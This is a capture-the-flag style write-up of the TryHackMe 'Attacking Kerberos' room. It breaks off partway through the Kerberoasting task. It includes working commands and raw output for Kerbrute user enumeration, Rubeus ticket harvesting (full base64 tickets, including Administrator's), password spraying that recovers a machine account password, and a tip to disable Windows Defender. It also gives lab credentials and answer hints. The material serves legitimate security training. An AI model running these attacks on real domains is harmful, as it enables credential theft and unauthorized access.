---
description: https://tryhackme.com/room/attackingkerberos
---

# Attacking Kerberos

🔗 [Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)

## Task 1 - Intro & Deploy machine <a href="#task-0-deploy-machine" id="task-0-deploy-machine"></a>

Attacker Machine: `10.8.161.114`

🎯 Target IP: `10.10.68.235`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine.

```bash
su
echo "10.10.68.235 CONTROLLER.local" >> /etc/hosts

mkdir -p thm/AD/ADK
cd thm/AD/ADK
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

The target machine is reachable using SSH or RDP protocols.

### What is Kerberos?

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

<div align="center"><figure><img src="../.gitbook/assets/image (10).png" alt="" width="188"><figcaption></figcaption></figure></div>

### Common Terminology&#x20;

* Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
* Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
* Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
* Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
* Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
* KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
* Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
* Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
* Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
* Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in orde

### Kerberos Authentication Overview

<figure><img src="https://i.imgur.com/VRr2B6w.png" alt=""><figcaption></figcaption></figure>

AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.

TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

### Kerberos Tickets Overview

The main ticket you will receive is a ticket-granting ticket (TGT). These can come in various forms, such as a .kirbi for Rubeus and .ccache for Impacket. A ticket is typically base64 encoded and can be used for multiple attacks.&#x20;

The ticket-granting ticket is only used to get service tickets from the KDC. When requesting a TGT from the KDC, the user will authenticate with their credentials to the KDC and request a ticket. The server will validate the credentials, create a TGT and encrypt it using the krbtgt key. The encrypted TGT and a session key will be sent to the user.

When the user needs to request a service ticket, they will send the TGT and the session key to the KDC, along with the service principal name (SPN) of the service they wish to access. The KDC will validate the TGT and session key. If they are correct, the KDC will grant the user a service ticket, which can be used to authenticate to the corresponding service.

Attack Privilege Requirements -

* Kerbrute Enumeration - No domain access required&#x20;
* Pass the Ticket - Access as a user to the domain required
* Kerberoasting - Access as any user required
* AS-REP Roasting - Access as any user required
* Golden Ticket - Full domain compromise (domain admin) required&#x20;
* Silver Ticket - Service hash required&#x20;
* Skeleton Key - Full domain compromise (domain admin) required

## Task 2 - Enumeration w/ Kerbrute

Download [Kerbrute](https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64) and make it executable using `chmod +x kerbrute_linux_amd64`

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
```

Download the [user wordlist](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt) provided by THM&#x20;

<details>

<summary>user.txt</summary>

abbotsen\
abbotson\
abbotsun\
abbott\
abbott\
abbottson\
abbreviate\
abbreviated\
abbreviation\
abby\
abbyabbye\
admin1\
admin2\
administrator\
blague\
blah\
blain\
blain\
blaine\
blaine\
blaineblainey\
blair\
blair\
blairblaire\
blais\
blaisdell\
cordes\
cordey\
cordi\
cordiacordial\
cordiality\
cordie\
cordiecordier\
cordierite\
cordiform\
cordillera\
cordilleras\
cording\
cordite\
cordle\
cordless\
doldrums\
dole\
dole\
doleful\
dolerite\
doley\
dolf\
dolhenty\
dolichocephalic\
doll\
doll\
dollar\
dollar\
dollarbird\
dollarfish\
dolley\
dollfuss\
eight\
eighteen\
eighteenmo\
eighteenth\
eightfold\
eighth\
eightieth\
eighty\
eijkman\
eikon\
eiland\
eileen\
eileen\
eileneeilis\
eimile\
einberger\
eindhoven\
forcer\
forcible\
forcier\
forcier\
ford\
ford\
forde\
fordham\
fording\
fordo\
fordone\
fore\
fore\
foreandaft\
foreandafter\
forearm\
gary\
httpservice\
machine1\
machine2\
platypus\
sqlservice\
user1\
user2\
user3

</details>

and brute force user accounts of our DC:

```bash
./kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt 
```

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### 2.1 - What is the domain name of our target?

Here below users found:

```
admin1@CONTROLLER.local
administrator@CONTROLLER.local
admin2@CONTROLLER.local
machine1@CONTROLLER.local
httpservice@CONTROLLER.local
sqlservice@CONTROLLER.local
machine2@CONTROLLER.local
user2@CONTROLLER.local
user3@CONTROLLER.local
user1@CONTROLLER.local
```

{% hint style="info" %}
10
{% endhint %}

### 2.2 - What is the SQL service account name?

{% hint style="info" %}
sqlservice
{% endhint %}

### 2.3 - What is the second "machine" account name? 

{% hint style="info" %}
machine2
{% endhint %}

### 2.4 - What is the third "user" account name?

{% hint style="info" %}
user3
{% endhint %}

## Task 3 - Harvesting & Brute-Forcing Tickets w/ Rubeus

{% hint style="info" %}
To start this task you will need to RDP or SSH into the machine your credentials are:

Username: Administrator

Password: P@\$$W0rd

Domain: controller.local
{% endhint %}

In this case i choose to connect target machine (`10.10.68.235`) via RDP using rdesktop (already present into Kali machine)

```bash
sudo rdesktop controller.local -u Administrator
```

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

#### Harvesting Tickets w/ Rubeus

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

```bash
cd Downloads
Rubeus.exe harvest /interval:30 #harvest for TGTs every 30 seconds
```

<details>

<summary>Output of "Rubeus.exe harvest /interval:30" command</summary>

Rubeus.exe harvest /interval:30

***

(\_\_\_\_\_ \ | | _**) ) | | \_\_\_\_\_ \_ \_ \_\_\_ | \_\_ /| | | | \_ | \_\_\_ | | | |/**_) | | \ | |_| | |_) ) _**| || |**_ | |_| |_|**/|**/|\_\_\_\_\_)\_\_**/(**\_/

v1.5.0

\[_] Action: TGT Harvesting (with auto-renewal) \[_] Monitoring every 30 seconds for new TGTs \[\*] Displaying the working TGT cache every 30 seconds

\[\*] Refreshing TGT ticket cache (6/28/2025 9:27:35 AM)

User : CONTROLLER-1$@CONTROLLER.LOCAL StartTime : 6/28/2025 6:25:20 AM EndTime : 6/28/2025 4:25:20 PM RenewTill : 7/5/2025 6:25:20 AM Flags : name\_canonicalize, pre\_authent, initial, renewable, forwardable Base64EncodedTicket :

```
doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEpkCKFvcmlZr3EgG5ZxauqkcfB3nFjFeaGMb
6FDp8pBBGcurPoQduOJ9aUO01IZxnKmWa46d9La8S1g8Dvc9kbMNQdTP88yRILFahRXCoOIw40XHls254f496dc/xcBdLGEzunJ9
L49UWGT2P4MYmrQIeV36o1jhsobKmAs2YhyDtwlvOkNW9MMCjr5FX9ucDlLRvxO7Izz+m4rTwH+B0TFiSyvJRcERqdPvAD0s+UkV
qt3RiIUJrqHM3DaQ9Wq9L2iRCcjcK4r2q898M6J5zFtvUkudikat6lh49O7oD1VrHpCzp4JcnkZB/jHBllu6GEEtJCRdWZC9GDKH
XN/haVWCBl93LkxSqd4xvG5PJacz7auGcEbxN3vsXofjwffAiTqeVDL6rWKab5+3QpQzhy4f3GRj3n2nfXaKVugJp+xQoPBLLgAF
7sjIU6+C9CPQmsFk0pw59wT058nYTgranSYjHjcpCNpBtKEK6dq+1dWl/X8LJOCJjnUNJjO+BSlc4F9CYOOdZyGjpDPxM76cjDS8
JFGHvA2vZwEzF23EwD0pPQ9qITBaNAreKT72sgo+ebaoXOcEUtGFIvRbWDiA8+ssIeZUlOfZxRZZodcQ4NazinazY9h9vTHQgCQZ
XRUfBTSJqJ5wt7dp7LlIjTKD5ZCw/c1AxSbGizGK1h25YanER0FyAHnNjZIpM4pI/MxOCzYPb2fpS417FTpUUb9Jwj11zRnIwtTl
c5Q5SXds0fKjp9RomCR6pYSLAS8rMiwsR45eDjb1eEah8+4vQsS7vY37FynKgMruzqgguTTYQlumznjTdUFTLMhyGdJ9sC8Pc0/o
06T3+YrCQf0OC/kwzoEaZ6wFG+kTYNdx1JfTE13cLDsNTkk1SBrUIBk7LUhTmjVu4rL0lQaCPZRyXKotbm9V9HDJPZHfHie4IkW1
Yp5wt+1kQuEP/4i+/o123t/kSUEHPrtBgeCSWyQak83VU0Y1RzjJYmbw++oqzg3r8+HfepRBfi0ZOQyAr0l8oYvoESEaZ/rWKXNH
y63C56C38HH1SP9dsb8OjQiFFM+djKhn6O1owPxrlB6YRH73DWVGty8dHdNc8/OzptDnZd/7h2cQBOsON+45HKGYdljylksIeL6k
HYTI8JDyiUW2RadJlR3mlvXlnG9ezPDaD57MbmEY3hn6OJKDRN5+YByECnps6YnYIZA/YUl054MjW4BWht9DVTrFd1LtA98Db8Et
+WTODJj8SP3xz3o4H96308Bto//F7QgIySbs1OoGpCGyIevKXikm9zo40BNeqqK/XVp6Y/4k7TSjcUE/srANro7XYFO/CMoASFLd
R9Z1SYKGipmHJhATxAIc2g9ChSTc6B/XKoSnpvGABsMXW54g4IntFxGjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
MCmgAwIBEqEiBCA8WDHaJi60GCL+nsohKRBMmLhXXzz1MHjJk/QVfYFU8KESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI1MDYyODEzMjUyMFqmERgPMjAyNTA2MjgyMzI1MjBapxEYDzIwMjUwNzA1
MTMyNTIwWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
```

User : CONTROLLER-1$@CONTROLLER.LOCAL StartTime : 6/28/2025 6:25:20 AM EndTime : 6/28/2025 4:25:20 PM RenewTill : 7/5/2025 6:25:20 AM Flags : name\_canonicalize, pre\_authent, renewable, forwarded, forwardable Base64EncodedTicket :

```
doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEp+tSmD2W78TlXyBIpdVwK9F4nDN/65P7Xx+
I3BDhyeoj++gUbawUYbo69DGeMPHRUbewroxFk9vyJ3SaluEdNdhdorcVyzfeAgBqYG+26nGJP3SeRg/EaFiHT12RTQAgv/nCCEh
hT42J2jEFyVIWq+S6mxnwnbbI5XTvJCr9Et58ePeygxab5aZvYupXLcNaK6cfCbNL6aaTtsZu3dWxAqb/wYIQpwL+5uboSW7vj8I
fY9Djjve8p1Vnx6vEyR+H0peCKTy5tzNyHl10rix5Pgd8e82brdhvHI1ksKdGeNiAerVAAD5joRjFiv75ODGrx5hjheemxGAzUoM
rbW5We2/+OQEWriQfoWUS3Qo0Q2wnoNoR0b9PQj4cb9hiPcvDq/zMSEuPsGDMmRYtbdsnd2CGyGAATByriEaIdKHPiqj0dDKq2Kl
LSC2C6b57ZMLhMlXfKyLBOI76kJe0a/YCD0mL66LPOGCTl71mD9AYfJdTiwbzSajKTil4ldwXvoAznsVb2mFbA0OYb8FjLVPVPEH
DUgY0dff/jQUmOfAGy2lXVW1go6m6aGbIefLafuOsMRY1ByiPmWCWFFShcjh4uwoJ53yjnoSak7oQ1qhwVpt+Gksa+86FL6c5ryE
QfkYGjjDql1pHDhq+2LgRN7tA6JUlC23U23gs7VeLPW7QRdyp5a0rwQ53i0Fjs9HAmkPdxC3tJ/xpS14ono1UP0MkB7cIf/E0IgH
wVZNNDMjgHQBj7Q9hYRO3CbGYEg7UQpnxv6DS2LR2Q7+317rjkafweBuIJdgmL6qUkewg/qbS+rPJx7bTxodh7DdTeoBxvaKRriR
ciFkI1jDkzfJzhhgkGDJ2K0oEeMZ51uxuh93DhbSQ9p7wMfNUSkzkC/j+g094Axs9zb04fhQVUfLNxX2BshD6J7xMpSE27gsMm0i
y+o0Z2d1MAtPWjq1GH6ts42DSP5AToWMyHNweNp35VyvFF6pnrOMddJjBXob8yzdBBwA1gWgAUP8qeG8khD78WKIwNFeDV4h7/uo
fVJMI6z4hSzmLCRBuaMZhBDbFyxleoGjf+TrcOhfHqwC6jj+lwzUfqaJTK5Qp2bS9iUUIrsM+ky/aL/gRPHKTO7GaX5vUeR/t77i
k83z86VNJEmMVRtLE8Z8aGwwhSlE0z5CPpagH5T7QDKy7K3hDIlxeh9cZHqVHHRbPPEWCHSBSd8TSob+xsvzTPHIN97jaZxSNTSL
8ZQ0VCcf25esc9YtURJGiqJYtF2XaPeBlgqP66FBXKzGe1IABfky6kJ2XQcI4/1DxNl0vxLydcmjmMlvc2pKCR/PbVzwSbGY34vY
he4vKTaHjxwdaY5c+QwtPvfPT1xMCil9QiJ7GfOmWbheYPAya77UzvyjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
MCmgAwIBEqEiBCCJAasOZFjLzGlmj/sHm0VdTQ7c7ASqvOSN43GHrHTbYKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDI1MDYyODEzMjUyMFqmERgPMjAyNTA2MjgyMzI1MjBapxEYDzIwMjUwNzA1
MTMyNTIwWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
```

User : Administrator@CONTROLLER.LOCAL StartTime : 6/28/2025 8:55:00 AM EndTime : 6/28/2025 6:55:00 PM RenewTill : 7/5/2025 8:55:00 AM Flags : name\_canonicalize, pre\_authent, initial, renewable, forwardable Base64EncodedTicket :

```
doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGlaQLHbt4arY+fS/Pp1CAeurcpDjQZcOmzpn
qczjq40cJN9yYgWz2NXcZa3QZyLDIjk+qGfAggF4HqxaGA7YFuEAs01F56Bh32HyRdugUl5V+Qeb+cuIqVte0a4QoOvmCZO36vwh
UVRuJ1aBwsUG0QzpSsahJMt4LcfKSAzpCFr32Q2Nd8otaiDCE4KCsrWaauV8vNBgyzT2c+nOFHwgxp/FPbaO2XMjwNsjuuIu97/T
Hu2lISy3SUj7rOVRHpsyFrAmkO6oJZp3F49SF/4k3Ate2U1J1Xb4qq3rHmeBnqMZ8GI9LNewZYhKhYCheT6+BSjCv+0za7M6QmJz
k/aqRc2Jj/rGLlZFCVXn7kEj9308H9HC0lQD/HBewdj+byR1qRXfCz+QL9BR4nM63JbcLoWiUttOAuJcd7snrDDwXXqUBJSp2VP5
iAOfFYJ+gPCjZ7TtBU4Xa8fG3ojV4dzKxb6EFeZbGLEuAjMqh3l0l0HyvXsdHS9dyJl5OmQj6I5uXOr7UrnuGdnbeLSpKZ2OMkmt
hg0kvk/q9QyLLuMdaRs5+CzXtwOXFOpg3+DiLqe0rraQ0kPtt5MG8raS9XRMjqjJ2uI9fezneGytf7KEfzqIilrqWWgKypVK0a/b
X0c/IjshFP9JHSO0+QHNu7UCK2v2R2ua3O/cBSQDYekXfTXSQGi/rRr7jxeEbLOoWUioph1EXlrdrJSdUzo175Wjm2vQKk51t6R6
O0QJmTSW231akTUXA+IW4qbRfhLhwl+8yhUDpE8JUmknPRfDNCnIVjrFUcuiF96x448yVGhjssrRZ2Vx9p9Wm8mb4PLs4diAQP+X
8hThpfZHHYyy2a1p8QyV3xSqZMWf0s7KsKTfGd46crlfnEYCFkmohR75bNsmxRM18q/q4KHNicvcJJAL8zISLTn6bwUmFqYCxS7a
ZGGEr2U7uU07vTA6tnr03y18G3HAhESubGSLitlbHEveVnYC+sQazssqygKVomwNWt8xhcd/eSLFgoRwWSrSTvLnxwyMzCATBFAA
/lg9vjFTubLCbXlXSVOhwKkZXOun2mHjF6jdYR8XrP70AmsAa+zGIi6LVEQe+ysPWNOxyC0lbknVjLxzSIf2EdEAXxy/K6Rumbi+
4Bb8eTo+w6ucBavYEnOWl9HxX42a+ptCsYcGdG2fLTzBeM0iyt+/9uWhZzA2nl1jKEcCWrYBukztHEh/iyJKddB2DQudnG6ZKdSj
OqKYws6htqM+DLbSc3DI55byqr5j18ubdOTyQiI+Pidil+6n+XAu9GUUP+n1X9VaP3CFkrjW1PPLMjnshQHaP4nSxdWjBLbS1wyk
9k3RToimHzf/rYvrWS+2pRgVj4oPVG+MNczlXsDIB+UFa97Hf9szDi85nTgvjfJNIKOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
MIHdMIHaoCswKaADAgESoSIEIBPn57kpwLjt5oW9ue6Jl84/t9e5OWmU0EYhlk9UEjufoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjUwNjI4MTU1NTAwWqYRGA8yMDI1MDYyOTAxNTUwMFqnERgP
MjAyNTA3MDUxNTU1MDBaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=
```

User : CONTROLLER-1$@CONTROLLER.LOCAL StartTime : 6/28/2025 6:54:46 AM EndTime : 6/28/2025 4:54:46 PM RenewTill : 7/5/2025 6:54:46 AM Flags : name\_canonicalize, pre\_authent, initial, renewable, forwardable Base64EncodedTicket :

```
doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEls3bn7AAIegSGpNtraOfVMLoWR4OcmkgvNP
1gcijpuE2zf+b//Gme+5mX1WFq67dxewvdY4mCb8lJozPBCP+eCp1+zQE2Zo1doc/3YgcP3iiFXyMUHukR7XtsuTpH7/O1KKs1X4
FQDo+Yb8Y5+atQOOnLzpZ5JEoOeJR9sZC2vIqQSofHNx4hrTaZERpCHkh/IDcdq4EKIhqaP87NDihWFl39xqKAJHT/ZAjqWqasDy
vEd6vp4HwemDhANGVzCZ9Nxeju5NTvAjYfw/CAxzc7DBKhRqFY+J1FcnWWG7/F6s/5sNorNIzwr2YyzyJSUeWny3VqGuO8eFb7UV
cN0/yBeLr4K51d9+aiSQptCtFCHPDWs+5fkoFT80Pz1r4PDBst+JEYEDZ617ehRH7OlNmKwYpUamvTdwB8SrjZhTFKboXkeY7u8b
21GQuqLWWm3ZOW5eSNMz908RStJpsr5T+2pPOKmZW8oGa+IppZEV0kTMKl8Af6oi7Mv2w8kzSAzAJZCMyeDG2tjatAkV3D0yBQJJ
3hoMvj0dtrSgD3b8gjAs1AOcPDpUv8Gsia66mCiKpXfL5Ybf9uJUgItiP0YctN5adZdX6W48vh68lGfjDyx6ndg8v4JPgqOaVxao
qX56UXRaZJOkcaXM6TtB1Vz7IUkiplSNnTJLpA71Ev8t+nGecizIr+s30gQe0Oj2i3Uj4k1OjykrQL/TEU28PoiotsURA3FSetfo
NrYATRqiCnAJhoiCUL9l9AuSGme/uAMoZsTU6uuspbpdRCGuwIgRE2pmb4BhR/TPHW1vtdVXSVed4myUONiloDCWL26CzpCnMQsU
hnBexQdbVGpr2yPFFQnFGHfF4JOPy9KSm0eWjpzXw+qqZZINufi2oK6E9mkM2GU9ptDL8X+seO3N7RyzVGO5O4hJEc3IFS7v/2nv
Cux5QwXBZkuYpxisfQ/4GyXdVjozgq5ykH+CAL0AE6fpy4d79Rc1JP7sRG9IjR+Ny2RspWjNO9kFYiRrCM7H79Us+UM0ODPs8lDx
Rwn1ETaDIQDdV5DNrDHvJbMXjt6uR6XzVSlqueRoyQYm/MPVbc0XnEm/sLuJQaRSGY387sfr7PO/ERWUEebTFacXxs6fmlWqD+cS
q8fAt8GLqakEPI26Y2J3X2a+SQ6dNUQOtrSVmRlCUC7XcQubipvRnZlk2KKPoEmhB50a9zWxsDxBGtbjJmn1E5bpX0tsqkrLjSob
ZYI3CZRe3YyHoyIwkF2B4TLk+ig1SS3lw8f9gPRMMTebIoM2zsr/l9Sg1TfSbyZIXzFqoElrV/TLjkvpGmi6ZWTJgpKTqrBLxJgA
9CI3NA0vaHhd6dVSRsbezxy2AEG0KxBQZqxJDKe5NvUaCe4ccS9V2wqjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
MCmgAwIBEqEiBCCSJrd/RRoEqYblShDcKUKmkNnMZKK+T3nY3/hoYDoxNKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI1MDYyODEzNTQ0NlqmERgPMjAyNTA2MjgyMzU0NDZapxEYDzIwMjUwNzA1
MTM1NDQ2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
```

\[_] Ticket cache size: 4 \[_] Sleeping until 6/28/2025 9:28:05 AM (30 seconds) for next display

</details>

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
To find the administrator ticket as well, you need to disable Windows Defender completely
{% endhint %}

#### Brute-Forcing / Password-Spraying w/ Rubeus

Rubeus can both brute force passwords as well as password spray user accounts.

Psw-Spraying attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

{% hint style="info" %}
Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command
{% endhint %}

```bash
echo 10.10.68.235 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user:

```bash
cd Downloads
Rubeus.exe brute /password:Password1 /noticket
```

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>Output of "Rubeus.exe brute /password:Password1 /noticket" command</summary>

Rubeus.exe brute /password:Password1 /noticket

***

(\_\_\_\_\_ \ | | _**) ) | | \_\_\_\_\_ \_ \_ \_\_\_ | \_\_ /| | | | \_ | \_\_\_ | | | |/**_) | | \ | |_| | |_) ) _**| || |**_ | |_| |_|**/|**/|\_\_\_\_\_)\_\_**/(**\_/

v1.5.0

\[-] Blocked/Disabled user => Guest \[-] Blocked/Disabled user => krbtgt \[+] STUPENDOUS => Machine1:Password1 \[\*] base64(Machine1.kirbi):

```
  doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
  JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
  BIID7dOYv4do7I+9mgWxU8uzhdZvVskgGOju99s72FCnlIF0eJTm1rNU6rJSB4+LTGKGdYWzH37CRy/A
  0EM4PXBbxyNK2EQUdzCLrNBzM2noJf4yfrC5mT1PM70+knFWiV1pxnZPfBN/9fPjpz62o7PY6nlY8URp
  p678hsYxfn/quUhvGnjLPV0iN+OF/+bn2Du++lfr1zrlIJJOOHPRlYOistaDDSBrOeX+sQ9lZAVAgcEH
  HH+VULFB+uzOQZh2OvOJnrPaSPqezZb0718sZYU2lJVQROcLMZ2UIZipGS9YWAzlVxtX1EyM+E7Ni7HT
  l4tirY5FVNiZleQCQxwnuEO8Tba5Mj+vzNoR0I7saPyEL0UBJ0yAl2q3/dEfTosUzaxbcwROiB5tZVDp
  B9R9tDK95FgS7hlY7QX5C1CoIDm4O1GK2B/xhgDLkX4PQlAtV9Emg30uuRVmAakSljkpczNOk1RvyPvz
  qdRew1zGZgtDSJrdIjcM07RCxub1AbluuX0DUeKAuZF0wIln5apCrwoSoOYDvwnoiuNg28nhniPMfY0y
  hJtrbGnZJBmcQs5udu549XgbVZg0X5R712H2dRV0eBLugiGM82K4dDMl7ETPYq8eRq1pdtsRixRg/8bP
  z96AR7N7EKTRdbZ/f2LmBDQkiGdDOTRqMy722njdCv1WNzUOW3IhiL5MwKGks42mL7xNK7IvXRPQVP+z
  uRI3VXklF39GRf5110JIRXqXJN/Z4T4Wjk3bu7gzhvLYvWR/ngFlfM96WaNytellr+rEeeo9iiAuEycK
  x60fzDpBs4j2nPlKk7lTvkLFeX9kvzDHMMknB1eZIGfHu2Gh71fwI0AyWIyf6sBRr0NK4Km/Ru6OJGGj
  B7vAJlYrIeQq6KMrFi8ZiAMVNhk0UbzJqjE+M2fVVxytnPlB97aK4Fiwmd+/9dMLhAFEDQolUNiOFqmb
  N9myM4wj62V/UhVIF1qPADTu/dBYp6MAnmK0UY69oXbeNjhZdR7MzUu/I51TPbyvZPsoOcglksYN1scb
  IMTcxxYBMMOnCisDvCCL7f15NNZ09wNHeeaJ6/PphCZzUodhWuWwECSjUDen5eFAZ/kduZbd+aGTis/W
  ajVcinDXeKbEzhS+SFgWll30HvQ7kmGybwUANGUxW5t3RwrnNSw30qhLh2ONcF8tkV366twpDEznYiEU
  +/eY5jfjj9EfN4b1Olyq2uGq9CsIpiQ4rsWg6EBYfHHyqqrFwyWw2vL7OCwVLcQ45yx0gxDlvCdcicgy
  UiK5cwMmiRJoLs7nyNRBmimLBDH1qlivJ0lp8Ili+11lDTwW1PGWIqNmorFTt0Rp/6OB8jCB76ADAgEA
  ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIIhLwJkyqV+JwL5+dvY8WMYEcCgST6HsivNd
  D8NJxLwwoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
  GA8yMDI1MDYyODE1MjUzNlqmERgPMjAyNTA2MjkwMTI1MzZapxEYDzIwMjUwNzA1MTUyNTM2WqgSGxBD
  T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
```

\[+] Done

</details>

### 3.1 - Which domain admin do we get a ticket for when harvesting tickets?

{% hint style="info" %}
Administrator
{% endhint %}

### 3.2 - Which domain controller do we get a ticket for when harvesting tickets?

{% hint style="info" %}
CONTROLLER-1
{% endhint %}

## Task 4 - Kerberoasting w/ Rubeus & Impacket

Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.

### 4.2 - What is the SQLService Password?

#### Rubeus (Method 1)

```bash
Rubeus.exe kerberoast
```

<details>

<summary>Output of "Rubeus.exe kerberoast" command</summary>

Rubeus.exe kerberoast

***

(\_\_\_\_\_ \ | | _**) ) | | \_\_\_\_\_ \_ \_ \_\_\_ | \_\_ /| | | | \_ | \_\_\_ | | | |/**_) | | \ | |_| | |_) ) _**| || |**_ | |_| |_|**/|**/|\_\_\_\_\_)\_\_**/(**\_/

v1.5.0

\[\*] Action: Kerberoasting

\[_] NOTICE: AES hashes will be returned for AES-enabled accounts. \[_] Use /ticket:X or /tgtdeleg to force RC4\_HMAC for these accounts.

\[\*] Searching the current domain for Kerberoastable users

\[\*] Total kerberoastable users : 2

